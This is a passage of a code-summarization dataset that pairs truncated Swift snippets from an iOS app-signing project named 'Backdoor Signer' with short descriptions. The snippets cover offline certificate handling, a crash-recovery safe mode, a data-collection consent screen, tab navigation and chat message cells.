    "code": "class OfflineSigningManager {\n// MARK: - Properties\n\n/// Singleton instance\nstatic let shared = OfflineSigningManager()\n\n/// Flag indicating if offline signing is enabled\nprivate(set) var isOfflineSigningEnabled = true\n\n/// Flag indicating if local certificates have been validated",
    "nl": "/ Manager for handling offline app signing functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "class"
  },
  {
    "id": "2098",
    "code": "func validateCertificates() {\n// Check if certificates exist at the expected locations\nlet fileManager = FileManager.default\nlet certExists = fileManager.fileExists(atPath: serverCertPath.path)\nlet keyExists = fileManager.fileExists(atPath: serverKeyPath.path)\n\n// Update validation state\nlocalCertificatesValidated = certExists && keyExists\nlastCertificateValidationTime = Date()\n",
    "nl": "MARK: - Initialization / Validate local certificates for offline signing / Public method to allow validation from outside the class",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2099",
    "code": "func toggleForceOfflineMode(_ force: Bool) {\nforceOfflineMode = force\n\n// Log the mode change\nDebug.shared.log(\nmessage: \"Offline signing mode \\(force ? \"forced\" : \"automatic\")\",\ntype: .info\n)\n\n// Post notification for UI updates",
    "nl": "/ Toggle forced offline mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2100",
    "code": "func setOfflineSigningEnabled(_ enabled: Bool) {\nisOfflineSigningEnabled = enabled\n\n// Log the setting change\nDebug.shared.log(\nmessage: \"Offline signing \\(enabled ? \"enabled\" : \"disabled\")\",\ntype: .info\n)\n\n// Update user defaults",
    "nl": "/ Enable/disable offline signing",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2101",
    "code": "func showOfflineModeIndicator(on view: UIView) {\n// Only show indicator if offline mode is active\nguard isOfflineModeActive else { return }",
    "nl": "/ Show offline mode indicator on view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2102",
    "code": "func hideOfflineModeIndicator(from view: UIView) {\nif let indicator = view.viewWithTag(8675) {",
    "nl": "/ Hide offline mode indicator from view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2103",
    "code": "func importLocalCertificates(certData: Data, keyData: Data, completion: @escaping (Bool, Error?) -> Void) {\ndo {",
    "nl": "/ Import local certificates",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2104",
    "code": "func getOfflineSigningCertificates() -> (cert: URL?, key: URL?) {\nguard localCertificatesValidated else {",
    "nl": "/ Get certificates for offline signing",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2105",
    "code": "private func validateLocalCertificates() -> Bool {\n// Prevent frequent revalidation\nif let lastValidation = lastCertificateValidationTime,\nDate().timeIntervalSince(lastValidation) < 60\n{ // Only validate once per minute",
    "nl": "Function validateLocalCertificates - implements validatelocalcertificates functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2106",
    "code": "private func createOfflineIndicator() -> UIView {\nlet container = UIView()\ncontainer.backgroundColor = UIColor.systemRed.withAlphaComponent(0.8)\ncontainer.layer.cornerRadius = 14\n\n// Create label\nlet label = UILabel()\nlabel.text = \"OFFLINE MODE\"\nlabel.font = UIFont.systemFont(ofSize: 12, weight: .bold)\nlabel.textColor = .white",
    "nl": "/ Create offline mode indicator",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2107",
    "code": "private func animateOfflineIndicator(_ indicator: UIView) {\n// Add subtle pulse animation\nUIView.animate(withDuration: 1.0, delay: 0, options: [.autoreverse, .repeat, .curveEaseInOut], animations: {",
    "nl": "/ Animate offline indicator",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2108",
    "code": "@objc private func networkStatusChanged(_ notification: Notification) {\nguard let isConnected = notification.userInfo?[\"isConnected\"] as? Bool else { return }",
    "nl": "/ Handle network status changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2109",
    "code": "extension UIViewController {\n/// Update UI for offline mode\nfunc updateForOfflineMode() {",
    "nl": "MARK: - Extension for UIViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "extension"
  },
  {
    "id": "2110",
    "code": "func updateForOfflineMode() {\nlet offlineManager = OfflineSigningManager.shared\n\nif offlineManager.isOfflineModeActive {",
    "nl": "/ Update UI for offline mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift",
    "code_type": "function"
  },
  {
    "id": "2111",
    "code": "class SafeModeLauncher {\nstatic let shared = SafeModeLauncher()\n\n// Keys for UserDefaults\nprivate let launchAttemptsKey = \"launchAttempts\"\nprivate let safeModeFlagKey = \"inSafeMode\"\nprivate let maxLaunchAttempts = 3\nprivate var launchSuccessMarked = false\n\n/// Whether the app is currently in safe mode",
    "nl": "/ SafeModeLauncher - Detects and recovers from repeated app crashes by providing a minimal safe mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift",
    "code_type": "class"
  },
  {
    "id": "2112",
    "code": "func recordLaunchAttempt() {\nlet launchAttempts = UserDefaults.standard.integer(forKey: launchAttemptsKey) + 1\nUserDefaults.standard.set(launchAttempts, forKey: launchAttemptsKey)\nUserDefaults.standard.synchronize()\n\nif launchAttempts >= maxLaunchAttempts {",
    "nl": "/ Record a launch attempt and enter safe mode if there have been too many failures",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift",
    "code_type": "function"
  },
  {
    "id": "2113",
    "code": "func markLaunchSuccessful() {\nlaunchSuccessMarked = true\n\n// Reset counter after successful launch with a delay to ensure stability\nDispatchQueue.main.asyncAfter(deadline: .now() + 5.0) { [weak self] in",
    "nl": "/ Mark the launch as successful, resetting the launch attempts counter",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift",
    "code_type": "function"
  },
  {
    "id": "2114",
    "code": "func enableSafeMode() {\nUserDefaults.standard.set(true, forKey: safeModeFlagKey)\n\n// Disable potentially problematic features\nUserDefaults.standard.set(false, forKey: \"AILearningEnabled\")\nUserDefaults.standard.set(false, forKey: \"AIServerSyncEnabled\")\nUserDefaults.standard.synchronize()\n\nprint(\"\u26a0\ufe0f SAFE MODE ENABLED - Limited functionality\")\n}",
    "nl": "/ Enable safe mode - limiting functionality to ensure stability",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift",
    "code_type": "function"
  },
  {
    "id": "2115",
    "code": "func disableSafeMode() {\n// Reset all relevant UserDefaults to ensure a clean state\nUserDefaults.standard.set(false, forKey: safeModeFlagKey)\nUserDefaults.standard.set(0, forKey: launchAttemptsKey)\n\n// Reset the selected tab to home to avoid potential issues\nUserDefaults.standard.set(\"home\", forKey: \"selectedTab\")\n\n// Clear any cached data that might be causing issues\nclearProblemCaches()",
    "nl": "/ Disable safe mode and reset launch attempts",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift",
    "code_type": "function"
  },
  {
    "id": "2116",
    "code": "private func clearProblemCaches() {\n// Clear image cache\ntry? FileManager.default.removeItem(at: FileManager.default.temporaryDirectory.appendingPathComponent(\"com.backdoor.imagecache\"))\n\n// Reset any problematic flags\nUserDefaults.standard.set(false, forKey: \"isShowingStartupPopup\")\nUserDefaults.standard.set(false, forKey: \"HasShownStartupPopup\")\n\n// Reset any animation flags\nUserDefaults.standard.set(false, forKey: \"animateIcon\")",
    "nl": "/ Clear caches that might be causing crashes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift",
    "code_type": "function"
  },
  {
    "id": "2117",
    "code": "func showSafeModeAlert(on viewController: UIViewController, completion: (() -> Void)? = nil) {\nlet alert = UIAlertController(\ntitle: \"Safe Mode Activated\",\nmessage: \"The app has been started in safe mode due to previous crashes. Advanced features are disabled for stability.\",\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"Continue\", style: .default) { _ in",
    "nl": "/ Present a safe mode alert to inform the user",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift",
    "code_type": "function"
  },
  {
    "id": "2118",
    "code": "private func promptForAppRestart(on viewController: UIViewController) {\nlet alert = UIAlertController(\ntitle: \"Restart Required\",\nmessage: \"The app needs to restart to exit safe mode. Do you want to restart now?\",\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"Restart Now\", style: .destructive) { [weak self] _ in",
    "nl": "/ Prompt the user to restart the app after exiting safe mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift",
    "code_type": "function"
  },
  {
    "id": "2119",
    "code": "protocol ConsentViewControllerDelegate: AnyObject {\nfunc userDidAcceptConsent()\nfunc userDidDeclineConsent()\n}\n\nclass ConsentViewController: UIViewController {",
    "nl": "protocol ConsentViewControllerDelegate - implements functionality related to consent view controller delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "protocol"
  },
  {
    "id": "2120",
    "code": "func userDidAcceptConsent()\nfunc userDidDeclineConsent()\n}\n\nclass ConsentViewController: UIViewController {",
    "nl": "Function userDidAcceptConsent - implements userdidacceptconsent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2121",
    "code": "func userDidDeclineConsent()\n}\n\nclass ConsentViewController: UIViewController {",
    "nl": "Function userDidDeclineConsent - implements userdiddeclineconsent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2122",
    "code": "class ConsentViewController: UIViewController {\n// MARK: - Properties\n\nweak var delegate: ConsentViewControllerDelegate?\n\nprivate let scrollView = UIScrollView()\nprivate let containerView = UIView()\nprivate let titleLabel = UILabel()\nprivate let iconImageView = UIImageView()\nprivate let consentTextView = UITextView()",
    "nl": "class ConsentViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2123",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\n}\n\n// MARK: - Setup\n\nprivate func setupUI() {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2124",
    "code": "private func setupUI() {\nview.backgroundColor = UIColor.systemBackground\n\n// Configure scroll view\nscrollView.translatesAutoresizingMaskIntoConstraints = false\ncontainerView.translatesAutoresizingMaskIntoConstraints = false\nview.addSubview(scrollView)\nscrollView.addSubview(containerView)\n\n// Configure icon",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2125",
    "code": "@objc private func togglePrivacyConsent() {\nisPrivacyAccepted.toggle()\n\nif isPrivacyAccepted {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2126",
    "code": "@objc private func acceptButtonTapped() {\n// Save consent to UserDefaults\nUserDefaults.standard.set(true, forKey: \"UserHasAcceptedDataCollection\")\nUserDefaults.standard.set(Date(), forKey: \"UserConsentDate\")\n\n// Notify delegate\ndelegate?.userDidAcceptConsent()\n\n// Dismiss\ndismiss(animated: true)",
    "nl": "Function acceptButtonTapped - implements acceptbuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2127",
    "code": "@objc private func declineButtonTapped() {\n// Save declined consent\nUserDefaults.standard.set(false, forKey: \"UserHasAcceptedDataCollection\")\n\n// Notify delegate\ndelegate?.userDidDeclineConsent()\n\n// Dismiss\ndismiss(animated: true)\n}",
    "nl": "Function declineButtonTapped - implements declinebuttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2128",
    "code": "private func getConsentText() -> String {\nreturn \"\"\"\nDATA COLLECTION POLICY\n\nAt Backdoor Signer, we're committed to providing you with a seamless and personalized experience while continuously improving our services. To do that, we collect and process certain information in a secure and responsible manner. Here's what we gather, why we need it, and how it helps us serve you better:\n\n1. HOW YOU USE THE APP\n\nWe track some details about your app experience to make it smoother and more tailored to you, such as:\n",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2129",
    "code": "extension Notification.Name {\nstatic let tabDidChange = Notification.Name(\"tabDidChange\")\nstatic let changeTab = Notification.Name(\"changeTab\")\n}\n\n/// Main TabView providing navigation between app sections with enhanced appearance\nstruct TabbarView: View {",
    "nl": "/ Extension to define notification names for tab-related events",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "extension"
  },
  {
    "id": "2130",
    "code": "struct TabbarView: View {\n// State for the selected tab, initialized from UserDefaults\n@State private var selectedTab: Tab = .init(rawValue: UserDefaults.standard\n.string(forKey: \"selectedTab\") ?? \"home\") ?? .home\n\n// Track if a programmatic tab change is in progress to avoid notification loops\n@State private var isProgrammaticTabChange = false\n\n// Animation states for enhanced transitions\n@State private var animateIcon = false",
    "nl": "/ Main TabView providing navigation between app sections with enhanced appearance",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "struct"
  },
  {
    "id": "2131",
    "code": "enum Tab: String, CaseIterable, Identifiable {\ncase home\ncase sources\ncase library\ncase ai\ncase settings\ncase bdgHub\n\nvar id: String { rawValue }",
    "nl": "Tab identifiers with enhanced visual properties",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "enum"
  },
  {
    "id": "2132",
    "code": "private func handleTabChangeNotification(_ notification: Notification) {\nif let newTab = notification.userInfo?[\"tab\"] as? String,\nlet tab = Tab(rawValue: newTab)\n{",
    "nl": "Handle tab change notification from other parts of the app with enhanced animations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2133",
    "code": "func findAllTabBars(in view: UIView?) -> [UITabBar] {\nguard let view = view else { return [] }",
    "nl": "Search for tab bars in the view hierarchy with proper safety checks",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2134",
    "code": "private func tabView(for tab: Tab) -> some View {\nswitch tab {",
    "nl": "Function tabView - implements tabview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2135",
    "code": "private func createTab<T: UIViewController>(\nviewController: T.Type,\ntitle: String,\nimageName: String,\nselectedImageName: String? = nil,\ncolor: Color,\nisSelected: Bool\n) -> some View {",
    "nl": "Function createTab - creates tab",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2136",
    "code": "struct NavigationViewController<Content: UIViewController>: UIViewControllerRepresentable {\nlet content: Content.Type\nlet title: String\nlet tintColor: UIColor\n\n// Coordinator to maintain controller references and prevent premature deallocations\nclass Coordinator {",
    "nl": "/ SwiftUI wrapper for UIKit view controllers with improved lifecycle management",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "struct"
  },
  {
    "id": "2137",
    "code": "class Coordinator {\nvar viewController: UIViewController?\n}\n\ninit(_ content: Content.Type, title: String, tintColor: UIColor = .systemBlue) {",
    "nl": "Coordinator to maintain controller references and prevent premature deallocations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "class"
  },
  {
    "id": "2138",
    "code": "func makeCoordinator() -> Coordinator {\nreturn Coordinator()\n}\n\nfunc makeUIViewController(context: Context) -> UINavigationController {",
    "nl": "Function makeCoordinator - implements makecoordinator functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2139",
    "code": "func makeUIViewController(context: Context) -> UINavigationController {\n// Create view controller\nlet viewController = content.init()\ncontext.coordinator.viewController = viewController\n\n// Configure view controller with improved styling\nviewController.navigationItem.title = title\n\n// Apply modern appearance\nviewController.view.backgroundColor = .systemBackground",
    "nl": "Function makeUIViewController - implements makeuiviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2140",
    "code": "func updateUIViewController(_ uiViewController: UINavigationController, context _: Context) {\n// Ensure the view controller remains responsive\nuiViewController.view.isUserInteractionEnabled = true\n\n// Update navigation bar tint color\nuiViewController.navigationBar.tintColor = tintColor\n\n// Update top view controller's properties if needed\nif let topVC = uiViewController.topViewController {",
    "nl": "Function updateUIViewController - updates uiviewcontroller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2141",
    "code": "protocol ViewControllerRefreshable {\nfunc refreshContent()\n}\n\n/// Default implementation for all UIViewControllers\nextension UIViewController: ViewControllerRefreshable {",
    "nl": "/ Protocol for view controllers that can refresh their content during tab switches",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "protocol"
  },
  {
    "id": "2142",
    "code": "func refreshContent()\n}\n\n/// Default implementation for all UIViewControllers\nextension UIViewController: ViewControllerRefreshable {",
    "nl": "Function refreshContent - implements refreshcontent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2143",
    "code": "extension UIViewController: ViewControllerRefreshable {\n@objc func refreshContent() {",
    "nl": "/ Default implementation for all UIViewControllers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "extension"
  },
  {
    "id": "2144",
    "code": "@objc func refreshContent() {\n// Default implementation does nothing\n// Subclasses can override this to refresh their content when tabs switch\n}\n}\n",
    "nl": "Function refreshContent - implements refreshcontent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift",
    "code_type": "function"
  },
  {
    "id": "2145",
    "code": "class AIMessageCell: UITableViewCell {\n// MARK: - Properties\n\nprivate let bubbleView = UIView()\nprivate let messageLabel = UILabel()\n\nprivate enum Constants {",
    "nl": "MARK: - AIMessageCell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift",
    "code_type": "class"
  },
  {
    "id": "2146",
    "code": "private enum Constants {\nstatic let cornerRadius: CGFloat = 16\nstatic let fontSize: CGFloat = 16\n\nstatic let bubblePadding: CGFloat = 12\nstatic let bubbleTopBottomPadding: CGFloat = 6\nstatic let bubbleMaxWidth: CGFloat = 280\n\nstatic let messagePadding: CGFloat = 12\nstatic let messageTopBottomPadding: CGFloat = 8",
    "nl": "enum Constants - implements functionality related to constants",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift",
    "code_type": "enum"
  },
  {
    "id": "2147",
    "code": "private func configureViews() {\nconfigureCellAppearance()\nconfigureBubbleView()\nconfigureMessageLabel()\nsetupConstraints()\n}\n\nprivate func configureCellAppearance() {",
    "nl": "MARK: - View Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2148",
    "code": "private func configureCellAppearance() {\nselectionStyle = .none\nbackgroundColor = .clear\n}\n\nprivate func configureBubbleView() {",
    "nl": "Function configureCellAppearance - implements configurecellappearance functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2149",
    "code": "private func configureBubbleView() {\nbubbleView.backgroundColor = .systemGray5\nbubbleView.layer.cornerRadius = Constants.cornerRadius\nbubbleView.layer.maskedCorners = [\n.layerMaxXMinYCorner,\n.layerMaxXMaxYCorner,\n.layerMinXMaxYCorner,\n]\n\nbubbleView.translatesAutoresizingMaskIntoConstraints = false",
    "nl": "Function configureBubbleView - implements configurebubbleview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2150",
    "code": "private func configureMessageLabel() {\nmessageLabel.numberOfLines = 0\nmessageLabel.textColor = .label\nmessageLabel.font = .systemFont(ofSize: Constants.fontSize)\n\nmessageLabel.translatesAutoresizingMaskIntoConstraints = false\nbubbleView.addSubview(messageLabel)\n}\n\nprivate func setupConstraints() {",
    "nl": "Function configureMessageLabel - implements configuremessagelabel functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2151",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\n// Bubble view constraints\nbubbleView.leadingAnchor.constraint(\nequalTo: contentView.leadingAnchor,\nconstant: Constants.bubblePadding\n),\nbubbleView.topAnchor.constraint(\nequalTo: contentView.topAnchor,\nconstant: Constants.bubbleTopBottomPadding",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2152",
    "code": "func configure(with message: ChatMessage) {\nmessageLabel.text = message.content\n}\n}\n",
    "nl": "MARK: - Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2153",
    "code": "class SystemMessageCell: UITableViewCell {\n// MARK: - Properties\n\nprivate let messageLabel = UILabel()\nprivate let containerView = UIView()\nprivate var animationImageView: UIImageView?\n\nprivate enum Constants {",
    "nl": "MARK: - SystemMessageCell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "class"
  },
  {
    "id": "2154",
    "code": "private enum Constants {\nstatic let cellPadding: CGFloat = 3\nstatic let labelPadding: CGFloat = 12\nstatic let iconSize: CGFloat = 20\nstatic let iconSpacing: CGFloat = 4\nstatic let cornerRadius: CGFloat = 10\nstatic let fontSize: CGFloat = 14\nstatic let animationDuration: TimeInterval = 0.5\nstatic let animationScale: CGFloat = 1.2\n}",
    "nl": "enum Constants - implements functionality related to constants",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "enum"
  },
  {
    "id": "2155",
    "code": "private func configureViews() {\nselectionStyle = .none\nbackgroundColor = .clear\n\nconfigureContainerView()\nconfigureMessageLabel()\nsetupConstraints()\n}\n\nprivate func configureContainerView() {",
    "nl": "MARK: - View Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2156",
    "code": "private func configureContainerView() {\ncontainerView.backgroundColor = .clear\ncontainerView.translatesAutoresizingMaskIntoConstraints = false\ncontentView.addSubview(containerView)\n}\n\nprivate func configureMessageLabel() {",
    "nl": "Function configureContainerView - implements configurecontainerview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2157",
    "code": "private func configureMessageLabel() {\nmessageLabel.numberOfLines = 0\nmessageLabel.textColor = .systemGray\nmessageLabel.font = .systemFont(ofSize: Constants.fontSize, weight: .medium)\nmessageLabel.textAlignment = .center\nmessageLabel.translatesAutoresizingMaskIntoConstraints = false\ncontainerView.addSubview(messageLabel)\n}\n\nprivate func setupConstraints() {",
    "nl": "Function configureMessageLabel - implements configuremessagelabel functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2158",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\n// Container view constraints\ncontainerView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor),\ncontainerView.trailingAnchor.constraint(equalTo: contentView.trailingAnchor),\ncontainerView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: Constants.cellPadding),\ncontainerView.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -Constants.cellPadding),\n\n// Message label constraints\nmessageLabel.centerXAnchor.constraint(equalTo: containerView.centerXAnchor),",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2159",
    "code": "func configure(with message: ChatMessage) {\n// Clear any existing animation\nclearAnimation()\n\n// Process the message content\nlet content = message.content ?? \"\"\n\n// Handle different system message types with specialized styling\nif content.contains(\"error\") || content.contains(\"failed\") || content.contains(\"Error:\") {",
    "nl": "MARK: - Message Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift",
    "code_type": "function"
  },
  {
    "id": "2160",
    "code": "private func configureErrorMessage(_ content: String) {\nmessageLabel.textColor = .systemRed\nmessageLabel.text = content\naddIconAnimation(iconName: \"exclamationmark.triangle.fill\", tintColor: .systemRed)\n}\n\nprivate func configureSuccessMessage(_ content: String) {",
    "nl": "Function configureErrorMessage - implements configureerrormessage functionality",
    "language": "swift",
